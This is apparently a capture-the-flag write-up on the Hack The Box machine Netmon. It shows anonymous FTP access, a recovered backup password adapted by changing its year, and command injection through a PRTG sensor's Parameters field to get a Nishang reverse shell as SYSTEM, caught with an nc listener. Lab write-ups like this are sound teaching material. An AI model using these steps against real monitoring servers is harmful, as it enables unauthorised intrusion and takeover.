---
layout: single
title: Netmon - Hack The Box
excerpt: "I think Netmon had the quickest first blood on HTB yet. The user flag could be grabbed by just using anonymous FTP and retrieving it from the user directory. I guessed the PRTG admin password after finding an old backup file and changing the year in the password from 2018 to 2019. Once inside PRTG, I got RCE as SYSTEM by creating a sensor and using Nishang's reverse shell oneliner."
date: 2019-06-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-netmon/netmon_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - ftp
  - prtg
  - powershell
  - nishang
  - config backups
---

![](/assets/images/htb-writeup-netmon/netmon_logo.png)

I think Netmon had the quickest first blood on HTB yet. The user flag could be grabbed by just using anonymous FTP and retrieving it from the user directory. I guessed the PRTG admin password after finding an old backup file and changing the year in the password from 2018 to 2019. Once inside PRTG, I got RCE as SYSTEM by creating a sensor and using Nishang's reverse shell oneliner.

## Summary

- We can log in with anonymous FTP and get the `user.txt` flag directly from the Public user folder
- There's a PRTG configuration backup containing an old password that we can download from FTP
- The PRTG password is the almost the same as the one found in the old backup but it ends with `2019` instead of `2018`
- We can get RCE using Powershell scripts running as sensors in PRTG

## Detailed steps

### Nmap scan

The nmap scan shows that anonymous FTP is allowed and that PRTG is running on the webserver.

```
# nmap -sC -sV -F 10.10.10.152
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 22:43 EST
Nmap scan report for netmon.htb (10.10.10.152)
Host is up (0.0090s latency).
Not shown: 95 closed ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Free flag from FTP

In the nmap scan, the script identified that the FTP server allows anonymous access. Because we're not constrained to `ftproot` and we can look around the entire disk of the box, I quickly found a `user.txt` flag in the `c:\users\public` folder.

```
# ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> cd /users/public
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  07:05AM       <DIR>          Documents
07-16-16  08:18AM       <DIR>          Downloads
07-16-16  08:18AM       <DIR>          Music
07-16-16  08:18AM       <DIR>          Pictures
02-02-19  11:35PM                   33 user.txt
07-16-16  08:18AM       <DIR>          Videos
226 Transfer complete.
ftp> type binary
200 Type set to I.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
33 bytes received in 0.01 secs (4.5173 kB/s)
ftp> exit
221 Goodbye.

root@ragingunicorn:~/htb/netmon# cat user.txt
dd58c...
```

I was too slow for first blood, someone else on HTB got user blood in under 2 minutes.

### Getting access to PRTG

The PRTG application is running on port 80:

![](/assets/images/htb-writeup-netmon/prtg_login.png)

I tried the default credentials `prtgadmin` / `prtgadmin` but I got access denied.

Looking in the filesystem, I found that the configuration directory for PRTG is under `c:\programdata\paessler`.

```
ftp> cd /programdata
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-02-19  11:15PM       <DIR>          Licenses
11-20-16  09:36PM       <DIR>          Microsoft
02-02-19  11:18PM       <DIR>          Paessler
```

I found the configuration file and an old configuration from last year.

```
ftp> cd "PRTG Network Monitor"
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
[...]
02-25-19  09:54PM              1189697 PRTG Configuration.dat
03-02-19  05:33PM              1198465 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
```

The `PRTG Configuration.dat` config file contains the credentials for user `prtgadmin` but they are encrypted (or hashed?) with what seems to be a proprietary method.

![](/assets/images/htb-writeup-netmon/prtg_new_creds.png)

When I checked `PRTG Configuration.old.bak`, I found the dbpassword: `PrTg@dmin2018`

![](/assets/images/htb-writeup-netmon/prtg_old_creds.png)

I tried this password with user `prtgadmin` on the PRTG login page but it didn't work. Then I realized that this is from a 2018 backup, maybe the admin is lazy and re-used the dbpassword for the admin account and simply used the current date (2019).

My guess was correct and I was able to log in with password `PrTg@dmin2019`

![](/assets/images/htb-writeup-netmon/prtg_mainpage.png)

### RCE through PRTG sensors

PRTG is a monitoring tool that supports a whole suite of sensors, like ping, http, snmp, etc. The server itself has been added in the device list, so it's safe to assume we can add sensors to it:

![](/assets/images/htb-writeup-netmon/prtg_devices.png)

I clicked add sensor on the 10.10.10.152 server then selected `EXE/Script sensor`.

![](/assets/images/htb-writeup-netmon/prtg_exe.png)

We can't add powershell custom scripts because we don't have write access to the application directory, but we can leverage the `Parameters` field to add additional code at the end of an existing Powershell script. I used Nishang to get a reverse shell. I added a semi colon at the beginning of the parameters, then pasted the Nishang code after.

![](/assets/images/htb-writeup-netmon/prtg_rce.png)

After the sensor is created, we hit the play button to execute it.

![](/assets/images/htb-writeup-netmon/prtg_rce2.png)

And we get a shell as `nt authority\system`. Box done!

```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.152] 55751

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> type c:\users\administrator\desktop\root.txt
30189...
```